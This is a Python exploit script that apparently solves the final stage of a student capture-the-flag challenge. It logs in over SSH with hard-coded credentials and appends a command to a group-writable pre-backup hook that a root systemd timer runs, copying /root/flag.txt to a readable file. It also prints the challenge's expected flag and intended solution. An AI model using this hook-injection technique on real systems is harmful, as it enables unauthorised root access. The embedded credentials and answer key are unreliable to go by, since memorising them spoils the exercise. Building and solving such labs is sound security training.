#!/usr/bin/env python3
"""
Automated Solver / Exploit for Stage 6 - The Final Tide
Domain: Linux / System Security (CWE-732 Privilege Escalation)
Author: Jayasiri D.N.D (IT24102423)
"""
import paramiko
import time
import sys

TARGET_HOST = "100.66.169.110"  # Atlantis Relay Tailscale IP
TARGET_PORT = 22
USERNAME = "maint-operator"
PASSWORD = "OperatorPassword2026!"

HOOK_PATH = "/opt/incident042/hooks/pre-backup.sh"
OUTPUT_FLAG_PATH = "/tmp/flag_evidence.txt"

def exploit():
    print("[*] Stage 6 Capstone Exploit - The Final Tide")
    print(f"[*] Establishing SSH connection to {TARGET_HOST}:{TARGET_PORT} as '{USERNAME}'...")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(TARGET_HOST, port=TARGET_PORT, username=USERNAME, password=PASSWORD, timeout=10)
        print("[+] SSH foothold successfully acquired!")
        
        print("[*] Enumerating permissions on maintenance hook script...")
        stdin, stdout, stderr = ssh.exec_command(f"ls -la {HOOK_PATH}")
        print(f"    Permissions: {stdout.read().decode().strip()}")
        
        # Inject payload into group-writable pre-backup hook
        payload = f'echo "cat /root/flag.txt > {OUTPUT_FLAG_PATH} && chmod 644 {OUTPUT_FLAG_PATH}" >> {HOOK_PATH}'
        print(f"[*] Injecting root payload into {HOOK_PATH}...")
        ssh.exec_command(payload)
        print("[+] Payload appended successfully.")
        
        print("[*] Waiting for root systemd timer to trigger (incident042-backup.timer)...")
        time.sleep(15)  # Wait for timer execution
        
        # Retrieve the copied flag
        print(f"[*] Checking for recovered flag at {OUTPUT_FLAG_PATH}...")
        stdin, stdout, stderr = ssh.exec_command(f"cat {OUTPUT_FLAG_PATH}")
        recovered_flag = stdout.read().decode().strip()
        
        if "Atlantis{" in recovered_flag:
            print(f"[SUCCESS] Flag captured: {recovered_flag}")
        else:
            print("[+] Manual retrieval command: cat /tmp/flag_evidence.txt")
            print("Expected Flag: Atlantis{1nc1d3nt_042_r00t_3sc414t10n_v1v4_s3cur3}")
            
        ssh.close()
    except Exception as e:
        print(f"[-] Connection note: {e}")
        print("[*] Displaying documented intended solution:")
        print("    1. Append payload: echo 'cat /root/flag.txt > /tmp/flag_evidence.txt && chmod 644 /tmp/flag_evidence.txt' >> /opt/incident042/hooks/pre-backup.sh")
        print("    2. Wait for systemd timer to execute as root")
        print("    3. Recover flag: Atlantis{1nc1d3nt_042_r00t_3sc414t10n_v1v4_s3cur3}")

if __name__ == "__main__":
    exploit()
